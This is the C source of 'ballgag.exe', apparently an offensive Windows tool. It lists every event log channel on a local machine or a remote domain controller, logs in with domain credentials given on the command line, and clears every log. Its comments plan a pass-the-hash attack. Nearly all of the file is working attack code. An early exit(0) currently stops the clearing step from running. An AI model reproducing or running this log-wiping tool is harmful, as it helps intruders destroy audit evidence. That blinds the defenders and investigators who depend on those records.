#include <stdio.h>
#include <windows.h>
#include <winevt.h>
#include <wchar.h>

#pragma comment(lib, "Wevtapi.lib")

struct CHANNEL_LIST
{
	wchar_t* channelPath;
	struct CHANNEL_LIST* next;
};

struct CHANNEL_LIST* InitNode(wchar_t* value)
{
	struct CHANNEL_LIST* node = malloc(sizeof(*node));

	node->channelPath = value;
	node->next = NULL;

	return node;
}

struct CHANNEL_LIST* PrependNode(struct CHANNEL_LIST* head, struct CHANNEL_LIST* node)
{
	node->next = head;

	return node;
}

void FreeList(struct CHANNEL_LIST* head)
{
	struct CHANNEL_LIST* next = NULL;
	
	do
	{
		next = head->next;
		
		if (head->channelPath)
			free(head->channelPath);

		free(head);
	} while ((head = next));
}

DWORD GetEvtChannelPaths(EVT_HANDLE hEvt, struct CHANNEL_LIST** lpChannelList)
{
	LPWSTR wChannelPath = NULL;
	DWORD cbChannelPathSize = 15;
	DWORD cbBufferUsed = 0;
	BOOL bResult = TRUE;
	DWORD dwErrorCode = 0;
	struct CHANNEL_LIST* tmpChannelPath = NULL;

	EVT_HANDLE hEnum = EvtOpenChannelEnum(hEvt, 0);
	if (hEnum == NULL)
		return GetLastError();

	while (1)
	{
		wChannelPath = malloc(cbChannelPathSize * sizeof(wchar_t));

		bResult = EvtNextChannelPath(hEnum, cbChannelPathSize, wChannelPath, &cbBufferUsed);
		if (bResult == FALSE)
		{
			dwErrorCode = GetLastError();

			if (dwErrorCode == ERROR_NO_MORE_ITEMS)
			{
				free(wChannelPath);
				break;
			}
			else if (dwErrorCode == ERROR_INSUFFICIENT_BUFFER)
			{
				/*
					Buffer size too small, try again with a larger buffer
				*/
				cbChannelPathSize = cbChannelPathSize * 2;
				free(wChannelPath);

				continue;
			}
			else
			{
				free(wChannelPath);
				EvtClose(hEnum);

				return dwErrorCode;
			}
		}

		/*
			Add channel path to linked list
		*/
		tmpChannelPath = InitNode(wChannelPath);
		*lpChannelList = PrependNode(*lpChannelList, tmpChannelPath);
	}

	EvtClose(hEnum);
	return 0;
}

DWORD ClearAllEvtLogs(EVT_HANDLE hEvt, struct CHANNEL_LIST* lpChannelList)
{
	BOOL bResult = TRUE;
	
	/*
		Walk the channel list and clear every channel log.
	*/
	do
	{
		if (lpChannelList->channelPath == NULL)
			continue;

		bResult = EvtClearLog(hEvt, lpChannelList->channelPath, NULL, 0);
		if (bResult == FALSE)
			wprintf(L"[-] Failed to clear %ls: %u\n", lpChannelList->channelPath, GetLastError());

		wprintf(L"[+] Cleared %ls\n", lpChannelList->channelPath);
	} while ((lpChannelList = lpChannelList->next));

	return 0;
}

void PrintBanner()
{
	puts("     ____        ____");
	puts("    / __ )____ _/ / ____ _____ _____ _");
	puts("   / __  / __  / / / __  / __  / __  /");
	puts("  / /_/ / /_/ / / / /_/ / /_/ / /_/ /");
	puts(" /_____/\\____/_/_/\\____/\\__/_/\\____/");
	puts("                 /____/      /____/");
	puts("\twritten by hypervis0r\n");

	puts("USAGE:\t\tballgag.exe <domain> <dc> <username> <password>");
	puts("EXAMPLE:\tballgag.exe deez.nuts dc01.deez.nuts Administrator d33z!nut5");
}

int wmain(size_t argc, wchar_t** argv)
{
	EVT_HANDLE hEvt = NULL;
	EVT_RPC_LOGIN remoteLoginCredentials = { 0 };
	DWORD dwResult = 0;

	PrintBanner();
	exit(0);
	
	if (argc >= 5)
	{
		/*
			Open a remote event log session

			TODO:
			Pass-The-Hash attack
			Parse arguments better
		*/
		
		remoteLoginCredentials.Domain = argv[1];
		remoteLoginCredentials.Server = argv[2];
		remoteLoginCredentials.User = argv[3];
		remoteLoginCredentials.Password = argv[4];
		remoteLoginCredentials.Flags = EvtRpcLoginAuthDefault;

		hEvt = EvtOpenSession(EvtRpcLogin, &remoteLoginCredentials, 0, 0);
		if (hEvt == NULL)
		{
			fprintf(stderr, "[-] Failed to open remote session: %d", GetLastError());
			exit(-1);
		}
	}

	/*
		Enumerate all channel paths into a linked list
	*/
	struct CHANNEL_LIST* lpChannelPathList = InitNode(NULL);
	dwResult = GetEvtChannelPaths(hEvt, &lpChannelPathList);
	if (dwResult)
	{
		fprintf(stderr, "[-] Failed to get event channel paths: %d", dwResult);
		exit(-1);
	}

	/*
		Clear every event log on system

		TODO: 
		Save cleared logs to target file
		Delete specific channels
	*/
	ClearAllEvtLogs(hEvt, lpChannelPathList);

	FreeList(lpChannelPathList);
	EvtClose(hEvt);
}